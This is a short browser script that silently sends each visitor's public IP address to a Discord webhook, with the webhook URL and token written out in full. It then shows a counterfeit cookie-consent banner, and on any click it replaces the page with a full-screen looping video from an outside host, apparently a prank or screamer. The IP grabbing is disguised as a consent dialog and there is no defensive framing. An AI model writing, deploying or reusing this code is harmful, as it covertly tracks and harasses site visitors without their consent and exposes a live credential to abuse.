var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", "https://api.ipify.org/", false ); // false for synchronous request
xmlHttp.send( null );



fetch('https://discord.com/api/webhooks/1101592283146637373/OA0skb_yVbKmxe9cB6a4uEYJyyr1h4_ItLMgD3x6ZTyKB7EKsPRjqvpsmx_yZUAaO28K', {
    method: 'POST',
    headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({"content": "IP address:" + xmlHttp.responseText,"embeds": null,"attachments": []})
})



document.body.innerHTML = "<div id='ccc-notify' class='ccc-notify__notify ccc-content--dark ' role='dialog' aria-labelledby='ccc-notify-title'><div class='ccc-notify-text'><h1 id='ccc-notify-title'>We use cookies to give you the best possible experience</h1><p>If you don't want to accept cookies you can change preferences</p></div><div class='ccc-notify-buttons'><button id='ccc-notify-accept' class='ccc-notify-button ccc-link ccc-tabbable ccc-accept-button'><span>I Accept Cookies</span></button><button id='ccc-notify-reject' class='ccc-notify-button ccc-link ccc-tabbable ccc-reject-button'><span>I Do Not Accept Cookies</span></button><button class='ccc-notify-button ccc-link ccc-tabbable ccc-notify-link'><span>Settings</span></button><button id='ccc-notify-dismiss' class='ccc-link ccc-tabbable' tabindex='0' aria-label='Close Cookie Control'><svg xmlns='http://www.w3.org/2000/svg' height='24' viewBox='0 0 24 24' width='24' aria-hidden='true'><path d='M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z'></path></svg></button></div></div>"

document.addEventListener("click", function () {
    document.body.innerHTML = '<video id="video" style="width: 100%; height: 100%; object-fit: cover;" src="https://pnrtscr.com/video.mp4" loop=""></video>';


    const video = document.getElementById("video");
    video.play();

    const { documentElement } = document;
    if(documentElement.requestFullscreen) documentElement.requestFullscreen();
    else if(documentElement.mozRequestFullScreen) documentElement.mozRequestFullScreen();
    else if(documentElement.webkitRequestFullscreen) documentElement.webkitRequestFullscreen();
    else if(documentElement.msRequestFullscreen) documentElement.msRequestFullscreen();
})







